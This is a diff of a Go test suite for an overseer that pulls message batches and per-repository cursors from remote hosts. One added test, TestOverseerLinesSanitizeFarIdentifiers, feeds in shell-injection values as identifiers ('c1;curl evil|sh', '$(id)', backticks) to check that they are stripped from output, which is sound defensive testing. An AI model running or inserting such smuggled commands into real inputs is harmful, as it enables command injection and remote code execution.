@@ -1330,13 +1330,18 @@ func fedOverseer(t *testing.T) *overseer {
 	return v
 }
 
-func stubBatches(t *testing.T, batches map[string][]fleetpkg.FarBatch, mis map[string][]fleetpkg.FarMisrouted, cursor map[string]int64) {
+func stubBatches(t *testing.T, batches map[string][]fleetpkg.FarBatch, mis map[string][]fleetpkg.FarMisrouted) {
 	t.Helper()
 	old := hostBatches
 	t.Cleanup(func() { hostBatches = old })
-	hostBatches = func(h fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted, int64) {
-		return batches[h.Host], mis[h.Host], cursor[h.Host]
+	hostBatches = func(h fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		return batches[h.Host], mis[h.Host]
 	}
+}
+
+// farCursor is the lane's cursor file for the far bus at common on mbp.
+func farCursor(v *overseer, common string) string {
+	return lanepkg.OverseerHostCursor(v.stateDir, "mbp", common)
 }
 
 func TestOverseerLinesCarryHost(t *testing.T) {
@@ -1441,8 +1446,8 @@ func TestOverseerRemoteBatchPrintedOnceAndCursorAdvances(t *testing.T) {
 	v := fedOverseer(t)
 	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg", "body": "hi"} }
 	stubBatches(t,
-		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Cursor: ovStart + 20, Events: []map[string]any{ev(ovStart - 5), ev(ovStart + 10), ev(ovStart + 20)}}}},
-		nil, map[string]int64{"mbp": ovStart + 20})
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 20, Events: []map[string]any{ev(ovStart - 5), ev(ovStart + 10), ev(ovStart + 20)}}}},
+		nil)
 	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
 	got := fedRun(t, v, doc(ovStart), doc(ovStart+minute))
 	if len(got[0]) != 1 || len(got[1]) != 0 {
@@ -1453,17 +1458,17 @@ func TestOverseerRemoteBatchPrintedOnceAndCursorAdvances(t *testing.T) {
 	if b["host"] != "mbp" || b["repo"] != "o/beta" || b["cursor"] != float64(ovStart+20) || len(events) != 2 {
 		t.Errorf("batch = %v, want host mbp repo o/beta cursor %d and the two events above the start", b, ovStart+20)
 	}
-	if got := readFile(filepath.Join(lanepkg.OverseerHostDir(v.stateDir, "mbp"), "cursor")); got != fmt.Sprintf("%d\n", ovStart+20) {
+	if got := readFile(farCursor(v, "/git/beta/.git")); got != fmt.Sprintf("%d\n", ovStart+20) {
 		t.Errorf("cursor file = %q, want %d", got, ovStart+20)
 	}
 }
 
-func TestOverseerRemoteCursorSeededAtStart(t *testing.T) {
+func TestOverseerRemoteSeededAtStart(t *testing.T) {
 	v := fedOverseer(t)
-	stubBatches(t, nil, nil, nil)
+	stubBatches(t, nil, nil)
 	fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
-	if got := readFile(filepath.Join(lanepkg.OverseerHostDir(v.stateDir, "mbp"), "cursor")); got != fmt.Sprintf("%d\n", ovStart) {
-		t.Errorf("cursor file = %q, want the lane start %d", got, ovStart)
+	if got := readFile(lanepkg.OverseerHostSeed(v.stateDir, "mbp")); got != fmt.Sprintf("%d\n", ovStart) {
+		t.Errorf("seed file = %q, want the lane start %d", got, ovStart)
 	}
 }
 
@@ -1471,23 +1476,124 @@ func TestOverseerRemoteBatchRedeliveredWhenFlushFails(t *testing.T) {
 	v := fedOverseer(t)
 	v.o.Flush = func() error { return errors.New("pipe") }
 	stubBatches(t,
-		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10)}}}}},
-		nil, map[string]int64{"mbp": ovStart + 10})
-	fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
-	if got := readFile(filepath.Join(lanepkg.OverseerHostDir(v.stateDir, "mbp"), "cursor")); got != fmt.Sprintf("%d\n", ovStart) {
-		t.Errorf("cursor file = %q, want it left at %d", got, ovStart)
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10)}}}}},
+		nil)
+	fedRun(t, v, withHosts(ovDoc(ovStart+10*minute), okHost("mbp", ovStart+10*minute)))
+	if _, err := os.Stat(farCursor(v, "/git/beta/.git")); !errors.Is(err, fs.ErrNotExist) {
+		t.Errorf("cursor file: %v, want none: the batch never reached the wire", err)
 	}
 }
 
 func TestOverseerRemoteMisroutedCarriesHostAndSenderOnly(t *testing.T) {
 	v := fedOverseer(t)
 	stubBatches(t, nil,
-		map[string][]fleetpkg.FarMisrouted{"mbp": {{Repo: "o/beta", CrewID: "c9", From: "worker:feat/x#s1", TS: ovStart + 5}, {Repo: "o/beta", CrewID: "c9", From: "worker:feat/y#s1", TS: ovStart + 6}}},
-		map[string]int64{"mbp": ovStart + 6})
+		map[string][]fleetpkg.FarMisrouted{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", CrewID: "c9", From: "worker:feat/x#s1", TS: ovStart + 5}, {Repo: "o/beta", Common: "/git/beta/.git", CrewID: "c9", From: "worker:feat/y#s1", TS: ovStart + 6}}})
 	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
 	got := fedRun(t, v, doc(ovStart), doc(ovStart+minute))
 	m := ofEvent(slices.Concat(got...), "misrouted_msg")
 	if len(m) != 1 || m[0]["host"] != "mbp" || m[0]["from"] != "worker:feat/x#s1" || m[0]["repo"] != "" || m[0]["crew"] != "" || m[0]["misrouted"] != float64(2) {
 		t.Errorf("misrouted lines = %v, want one for host mbp from the first sender", m)
+	}
+	if got := readFile(farCursor(v, "/git/beta/.git")); got != fmt.Sprintf("%d\n", ovStart+6) {
+		t.Errorf("cursor file = %q, want the newest misrouted %d", got, ovStart+6)
+	}
+}
+
+func TestOverseerRemoteQuietCursorsFollowTheFarClock(t *testing.T) {
+	v := fedOverseer(t)
+	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg"} }
+	pulls := [][]fleetpkg.FarBatch{
+		{{Repo: "o/a", Common: "/git/a/.git", Cursor: ovStart + 1, Events: []map[string]any{ev(ovStart + 1)}}},
+		nil,
+	}
+	old := hostBatches
+	t.Cleanup(func() { hostBatches = old })
+	n := 0
+	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		n++
+		return pulls[n-1], nil
+	}
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	fedRun(t, v, doc(ovStart+minute), doc(ovStart+10*minute))
+	if got, want := readFile(farCursor(v, "/git/a/.git")), fmt.Sprintf("%d\n", ovStart+9*minute); got != want {
+		t.Errorf("quiet bus cursor = %q, want %q: the far ts less farSettle", got, want)
+	}
+}
+
+func TestOverseerLinesSanitizeFarIdentifiers(t *testing.T) {
+	const evil = "c1;curl evil|sh"
+	abandoned := ovWorker("worker:feat/$(id)#s1", "failed")
+	abandoned["detail"] = "blocked, no dispatcher reply"
+	host := func(ts int64, state, attention string, ws ...map[string]any) fleetpkg.HostStatus {
+		r := ovRepo("beta", ovCrew(evil, state, attention, ws...))
+		r.Repo = "a/b$(id)"
+		return okHost("mbp", ts, r)
+	}
+	stubBatches(t,
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "a/b$(id)", Common: "/git/beta/.git", Cursor: ovStart + 10, Events: []map[string]any{{"ts": float64(ovStart + 10), "kind": "msg"}}}}},
+		nil)
+	got := fedRun(t, fedOverseer(t),
+		withHosts(ovDoc(ovStart), host(ovStart, "live", "attended")),
+		withHosts(ovDoc(ovStart+minute), host(ovStart+minute, "dead `x`", "unattended", abandoned)))
+	lines := slices.Concat(got...)
+	if len(ofEvent(lines, "dispatcher_down")) != 1 || len(ofEvent(lines, "abandoned")) != 1 {
+		t.Fatalf("lines = %v, want dispatcher_down and abandoned", lines)
+	}
+	for _, l := range lines {
+		raw, err := json.Marshal(l)
+		if err != nil {
+			t.Fatal(err)
+		}
+		if i := bytes.IndexAny(raw, "$(;` |"); i >= 0 {
+			t.Errorf("%q reached a lane line: %s", raw[i], raw)
+		}
+	}
+}
+
+func TestOverseerRemoteRepoCursorsKeepALateReply(t *testing.T) {
+	v := fedOverseer(t)
+	t0 := ovStart + 10
+	ev := func(ts int64) map[string]any { return map[string]any{"ts": float64(ts), "kind": "msg", "body": "hi"} }
+	// Pull 1 folded bus A while it was empty, then B with its t0+3 reply; A's
+	// t0+1 reply landed after A was folded, so only pull 2 holds it.
+	b := fleetpkg.FarBatch{Repo: "o/b", Common: "/git/b/.git", Cursor: t0 + 3, Events: []map[string]any{ev(t0 + 3)}}
+	a := fleetpkg.FarBatch{Repo: "o/a", Common: "/git/a/.git", Cursor: t0 + 1, Events: []map[string]any{ev(t0 + 1)}}
+	pulls := [][]fleetpkg.FarBatch{{b}, {a, b}}
+	old := hostBatches
+	t.Cleanup(func() { hostBatches = old })
+	n := 0
+	hostBatches = func(fleetpkg.HostStatus) ([]fleetpkg.FarBatch, []fleetpkg.FarMisrouted) {
+		n++
+		return pulls[n-1], nil
+	}
+	doc := func(ts int64) fleetpkg.StatusDoc { return withHosts(ovDoc(ts), okHost("mbp", ts)) }
+	got := fedRun(t, v, doc(ovStart+minute), doc(ovStart+minute+1))
+	if len(got[0]) != 1 || got[0][0]["repo"] != "o/b" {
+		t.Errorf("pull 1 lines = %v, want B's batch", got[0])
+	}
+	if len(got[1]) != 1 || got[1][0]["repo"] != "o/a" {
+		t.Errorf("pull 2 lines = %v, want only A's late reply", got[1])
+	}
+	for common, want := range map[string]int64{"/git/a/.git": t0 + 1, "/git/b/.git": t0 + 3} {
+		if got := readFile(farCursor(v, common)); got != fmt.Sprintf("%d\n", want) {
+			t.Errorf("%s cursor = %q, want %d", common, got, want)
+		}
+	}
+}
+
+func TestOverseerRemoteReplyTSInFloatForm(t *testing.T) {
+	v := fedOverseer(t)
+	stubBatches(t,
+		map[string][]fleetpkg.FarBatch{"mbp": {{Repo: "o/beta", Common: "/git/beta/.git", Cursor: ovStart + 20, Events: []map[string]any{
+			{"ts": json.Number("1800000000010.0"), "kind": "msg"},
+			{"ts": json.Number("1.80000000002e12"), "kind": "msg"},
+		}}}},
+		nil)
+	got := fedRun(t, v, withHosts(ovDoc(ovStart), okHost("mbp", ovStart)))
+	if len(got[0]) != 1 {
+		t.Fatalf("lines = %v, want the batch", got[0])
+	}
+	if events, _ := got[0][0]["events"].([]any); len(events) != 2 {
+		t.Errorf("events = %v, want both replies above the cursor", got[0][0]["events"])
 	}
 }
